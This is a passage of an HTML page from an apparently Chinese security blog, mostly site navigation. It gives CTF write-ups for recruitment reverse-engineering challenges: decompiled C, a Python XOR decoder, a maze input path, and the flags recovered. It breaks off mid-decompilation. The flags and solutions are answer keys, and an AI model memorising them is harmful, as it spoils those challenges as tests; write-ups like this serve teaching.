+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-6" type="checkbox" id="nav-4-6">
+    
+    <label class="md-nav__link" for="nav-4-6">
+      Crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-6">
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/decrypt_online/" title="Decrypt online" class="md-nav__link">
+      Decrypt online
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/rsa待填/" title="Rsa待填" class="md-nav__link">
+      Rsa待填
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-7" type="checkbox" id="nav-4-7">
+    
+    <label class="md-nav__link" for="nav-4-7">
+      Misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-7">
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/dropsec12.9/" title="misc" class="md-nav__link">
+      misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/misc/" title="Misc" class="md-nav__link">
+      Misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/webasm/" title="Webasm" class="md-nav__link">
+      Webasm
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/wireshark/" title="Wireshark" class="md-nav__link">
+      Wireshark
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/内存取证/" title="内存取证" class="md-nav__link">
+      内存取证
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-8" type="checkbox" id="nav-4-8">
+    
+    <label class="md-nav__link" for="nav-4-8">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-8">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/ROP/" title="ROP" class="md-nav__link">
+      ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/basic/" title="Basic" class="md-nav__link">
+      Basic
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/fmt/" title="Fmt" class="md-nav__link">
+      Fmt
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/heap/" title="Heap" class="md-nav__link">
+      Heap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/res/" title="Res" class="md-nav__link">
+      Res
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-9" type="checkbox" id="nav-4-9">
+    
+    <label class="md-nav__link" for="nav-4-9">
+      Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-9">
+        Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/ReversingEngineering/" title="ReversingEngineering" class="md-nav__link">
+      ReversingEngineering
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/ida_py/" title="Ida py" class="md-nav__link">
+      Ida py
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/mov混淆/" title="Mov混淆" class="md-nav__link">
+      Mov混淆
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/pyc/" title="Pyc" class="md-nav__link">
+      Pyc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/shark恒/" title="Shark恒" class="md-nav__link">
+      Shark恒
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/" title="Unpack" class="md-nav__link">
+      Unpack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/反调试/" title="反调试" class="md-nav__link">
+      反调试
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/各种段/" title="各种段" class="md-nav__link">
+      各种段
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/黑影vip/" title="黑影vip" class="md-nav__link">
+      黑影vip
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-10" type="checkbox" id="nav-4-10">
+    
+    <label class="md-nav__link" for="nav-4-10">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-10">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/basic/" title="Basic" class="md-nav__link">
+      Basic
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/php文件包含/" title="Php文件包含" class="md-nav__link">
+      Php文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/ssti/" title="Ssti" class="md-nav__link">
+      Ssti
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-11" type="checkbox" id="nav-4-11" checked>
+    
+    <label class="md-nav__link" for="nav-4-11">
+      Wp
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-11">
+        Wp
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../2018护网杯/" title="wp" class="md-nav__link">
+      wp
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../catalyst/" title="Catalyst" class="md-nav__link">
+      Catalyst
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-11-3" type="checkbox" id="nav-4-11-3" checked>
+    
+    <label class="md-nav__link" for="nav-4-11-3">
+      L3sec招新
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-11-3">
+        L3sec招新
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Wp
+      </label>
+    
+    <a href="./" title="Wp" class="md-nav__link md-nav__link--active">
+      Wp
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reverse" title="reverse" class="md-nav__link">
+    reverse
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#welcome" title="Welcome" class="md-nav__link">
+    Welcome
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#encryption" title="Encryption" class="md-nav__link">
+    Encryption
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#maze" title="maze" class="md-nav__link">
+    maze
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mang" title="Mang" class="md-nav__link">
+    Mang
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" title="misc" class="md-nav__link">
+    misc
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#picture" title="Picture" class="md-nav__link">
+    Picture
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#traffic1" title="traffic1" class="md-nav__link">
+    traffic1
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tips" title="解压tips" class="md-nav__link">
+    解压tips
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="分析流量包" class="md-nav__link">
+    分析流量包
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" title="pwn" class="md-nav__link">
+    pwn
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stack" title="stack" class="md-nav__link">
+    stack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vitamin" title="vitamin" class="md-nav__link">
+    vitamin
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#randgame" title="RandGame" class="md-nav__link">
+    RandGame
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pubg-cheating-tools" title="pubg cheating tools" class="md-nav__link">
+    pubg cheating tools
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Ics
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Ics
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../ics/发现/" title="发现" class="md-nav__link">
+      发现
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      keyAndSetting
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        keyAndSetting
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../keyAndSetting/各种Key/" title="windows kms key" class="md-nav__link">
+      windows kms key
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      Shell
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Shell
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../shell/getshell/" title="Getshell" class="md-nav__link">
+      Getshell
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../shell/phar/" title="Phar" class="md-nav__link">
+      Phar
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../shell/phpmyadmin/" title="Phpmyadmin" class="md-nav__link">
+      Phpmyadmin
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reverse" title="reverse" class="md-nav__link">
+    reverse
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#welcome" title="Welcome" class="md-nav__link">
+    Welcome
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#encryption" title="Encryption" class="md-nav__link">
+    Encryption
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#maze" title="maze" class="md-nav__link">
+    maze
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mang" title="Mang" class="md-nav__link">
+    Mang
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" title="misc" class="md-nav__link">
+    misc
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#picture" title="Picture" class="md-nav__link">
+    Picture
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#traffic1" title="traffic1" class="md-nav__link">
+    traffic1
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tips" title="解压tips" class="md-nav__link">
+    解压tips
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="分析流量包" class="md-nav__link">
+    分析流量包
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" title="pwn" class="md-nav__link">
+    pwn
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stack" title="stack" class="md-nav__link">
+    stack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vitamin" title="vitamin" class="md-nav__link">
+    vitamin
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#randgame" title="RandGame" class="md-nav__link">
+    RandGame
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pubg-cheating-tools" title="pubg cheating tools" class="md-nav__link">
+    pubg cheating tools
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/wp/L3sec招新/wp.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>Wp</h1>
+                
+                <h2 id="reverse">reverse<a class="headerlink" href="#reverse" title="Permanent link">&para;</a></h2>
+<h3 id="welcome">Welcome<a class="headerlink" href="#welcome" title="Permanent link">&para;</a></h3>
+<p>题目是明文</p>
+<h3 id="encryption">Encryption<a class="headerlink" href="#encryption" title="Permanent link">&para;</a></h3>
+<p>Aspack 加壳，使用esp定律脱壳后将算法逆向即可,算法如下
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">start</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// edx</span>
+  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// ecx</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-8h]</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-8h]</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-8h]</span>
+  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-4h]</span>
+
+  <span class="n">sscanf_s</span><span class="p">(</span><span class="s">&quot;Firstly, show me your secret unsigned integer:&quot;</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+  <span class="n">strtoll</span><span class="p">(</span><span class="s">&quot;%u&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
+  <span class="n">v6</span> <span class="o">^=</span> <span class="mh">0xCAFEBABE</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="mh">0xDEADBEEF</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">sscanf_s</span><span class="p">(</span><span class="s">&quot;Wrong code&quot;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+<span class="nl">LABEL_3</span><span class="p">:</span>
+    <span class="n">ReleaseActCtx</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0x5DC</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">sscanf_s</span><span class="p">(</span><span class="s">&quot;And now, give me your flag:&quot;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+  <span class="n">strtoll</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">byte_403370</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">byte_403370</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">byte_403370</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v2</span> <span class="o">+</span> <span class="mh">0x1A</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">byte_403370</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">!=</span> <span class="n">byte_4021F0</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">v2</span> <span class="o">&gt;=</span> <span class="n">v1</span> <span class="p">)</span>
+        <span class="k">goto</span> <span class="n">LABEL_7</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">sscanf_s</span><span class="p">(</span><span class="s">&quot;This is not the flag that I want&quot;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+    <span class="k">goto</span> <span class="n">LABEL_3</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="nl">LABEL_7</span><span class="p">:</span>
+  <span class="n">sscanf_s</span><span class="p">(</span><span class="s">&quot;You Win! Post your secret code, flag and your writeup to our website plz&quot;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+  <span class="n">vwscanf</span><span class="p">(</span><span class="s">&quot;pause&quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div></p>
+<div class="codehilite"><pre><span></span><span class="n">e</span><span class="o">=</span><span class="p">[</span>
+  <span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> 
+  <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> 
+  <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x4F</span>
+  <span class="p">]</span>
+
+<span class="n">f</span><span class="o">=</span><span class="p">[]</span>
+<span class="n">len_e</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">while</span><span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len_e</span><span class="p">):</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mh">0x1a</span><span class="p">))</span>
+    <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span>
+<span class="c1"># output:flag{E4Sy_X0R_3nCrypt10n}</span>
+</pre></div>
+
+<h3 id="maze">maze<a class="headerlink" href="#maze" title="Permanent link">&para;</a></h3>
+<p>貌似有tls反调试，可以直接再main函数下断进行调试，不过直接查找字符串就可以看到迷宫
+<div class="codehilite"><pre><span></span>#-############################
+#-###########----------------#
+#-###########-#########-######
+#-------------#########-######
+####-####-#############-######
+#####-------###########-######
+#####-###############---######
+#-----############----########
+##################-###########
+</pre></div>
+根据逻辑，看样子只用输入wasd就好了
+<img alt="wasd" src="../2019-02-11-15-39-38.png" />
+最后得到结果
+input: </p>
+<blockquote>
+<p>sssddddddddddddwwddddddddddssssssaasaaas
+output:
+Congratulations!
+flag{HUST_CyberSecurity}</p>
+</blockquote>
+<h3 id="mang">Mang<a class="headerlink" href="#mang" title="Permanent link">&para;</a></h3>
+<p>可以看到有三段md5，分别解开后得到lyjjj tql wsl，中间要用<code>_</code>得到<code>lyjjj_tql_wsl</code> 这个作为rc4解密的key，解开flag得到<code>flag{l3h_Plastic_Memory}</code>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// ebx</span>
+  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// esi</span>
+  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// edx</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-180h]</span>
+  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+28h] [ebp-174h]</span>
+  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [esp+38h] [ebp-164h]</span>
+  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-160h]</span>
+  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [esp+40h] [ebp-15Ch]</span>
+  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [esp+44h] [ebp-158h]</span>
+  <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [esp+48h] [ebp-154h]</span>
+  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [esp+4Ch] [ebp-150h]</span>
+  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [esp+90h] [ebp-10Ch]</span>
+
+  <span class="n">__main</span><span class="p">();</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v3</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000u</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">);</span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100u</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please input something...&quot;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">)</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+  <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v8</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="mi">5u</span><span class="p">);</span>
+  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
